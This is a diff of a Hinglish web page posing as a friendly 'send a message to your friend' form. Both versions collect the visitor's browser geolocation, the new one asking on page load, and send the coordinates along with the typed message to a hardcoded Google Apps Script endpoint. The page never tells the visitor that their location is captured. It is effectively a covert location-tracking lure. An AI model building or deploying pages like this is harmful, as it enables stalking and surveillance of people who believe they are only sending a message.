@@ -1,83 +1,95 @@
 <!DOCTYPE html>
 <html lang="hi">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Welcome Dear</title>
-<style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Welcome Message</title>
+  <style>
     body {
-        background-color: #ffc0cb; /* Gulabi background */
-        font-family: Arial, sans-serif;
-        text-align: center;
-        padding: 20px;
-        color: #333;
+      background-color: #ffc0cb; /* Gulabi background */
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px;
+      color: #333;
     }
     h1 {
-        font-size: 20px;
-        margin-bottom: 20px;
+      font-size: 20px;
+      margin-bottom: 20px;
     }
     input[type="text"] {
-        padding: 10px;
-        width: 80%;
-        max-width: 300px;
-        border: none;
-        border-radius: 5px;
-        margin-bottom: 10px;
+      width: 80%;
+      max-width: 300px;
+      padding: 10px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
     }
     button {
-        padding: 10px 20px;
-        border: none;
-        background-color: #ff69b4;
-        color: white;
-        border-radius: 5px;
-        font-size: 16px;
-        cursor: pointer;
+      padding: 10px 20px;
+      font-size: 16px;
+      margin-top: 12px;
+      border: none;
+      border-radius: 5px;
+      background-color: #ff69b4;
+      color: #fff;
+      cursor: pointer;
     }
-    button:hover {
-        background-color: #ff1493;
+    button:hover { background-color: #ff1493; }
+    .status {
+      margin-top: 15px;
+      font-weight: bold;
     }
-    .success {
-        margin-top: 15px;
-        color: green;
-        font-weight: bold;
-    }
-</style>
+  </style>
 </head>
 <body>
+  <h1>Welcome dear, aap apna message send kar sakte hain apne dost ke liye</h1>
+  <input type="text" id="message" placeholder="Apna message likhiye">
+  <br>
+  <button id="sendBtn">Send</button>
+  <p class="status" id="status"></p>
 
-<h1>Welcome dear, aap apna message send kar sakte hain apne dost ke liye</h1>
+  <script>
+    let latitude = '', longitude = '';
 
-<input type="text" id="message" placeholder="Apna message likhiye">
-<br>
-<button onclick="sendData()">Send</button>
+    // Page load par location ask karo
+    window.onload = () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            latitude = pos.coords.latitude;
+            longitude = pos.coords.longitude;
+          },
+          err => { console.warn('Location denied or unavailable.'); }
+        );
+      }
+    };
 
-<p class="success" id="status"></p>
-
-<script>
-function sendData() {
-    if (!navigator.geolocation) {
-        alert("Geolocation is not supported by your browser.");
+    document.getElementById('sendBtn').onclick = async () => {
+      const msg = document.getElementById('message').value.trim();
+      if (!msg) {
+        document.getElementById('status').textContent = 'Message likho pehle!';
         return;
-    }
+      }
 
-    navigator.geolocation.getCurrentPosition(function(position) {
-        var lat = position.coords.latitude;
-        var lon = position.coords.longitude;
-        var msg = document.getElementById("message").value;
+      const payload = {
+        message: msg,
+        latitude: latitude,
+        longitude: longitude
+      };
 
-        // Google Script ka URL yahan lagao
-        var url = "https://script.google.com/macros/s/AKfycbz8suBhlxuRwNSyD_oZSAapQNTK3nZZY4Y3mr9RBqR1XJbZtrv4OGLwEv6IFOe2OKZ4Mg/exec";
-
-        fetch(url + "?latitude=" + lat + "&longitude=" + lon + "&message=" + encodeURIComponent(msg))
-        .then(res => {
-            document.getElementById("status").innerText = "Message send successfully ✅";
-        })
-        .catch(err => {
-            document.getElementById("status").innerText = "Error sending data ❌";
-        });
-    });
-}
-</script>
-
+      fetch("https://script.google.com/macros/s/AKfycbyWx8UnBnspDRxEUpupA0cR6Iy2Tl-vW1AJ51kpxz05qGXItaJHqkiWFg3pxTK3lzWlCg/exec", {
+        method: "POST",
+        mode: "no-cors", // avoid CORS blocking
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      })
+      .then(() => {
+        document.getElementById('status').textContent = 'Message sent successfully ✅';
+      })
+      .catch(() => {
+        document.getElementById('status').textContent = 'Error sending data ❌';
+      });
+    };
+  </script>
 </body>
 </html>
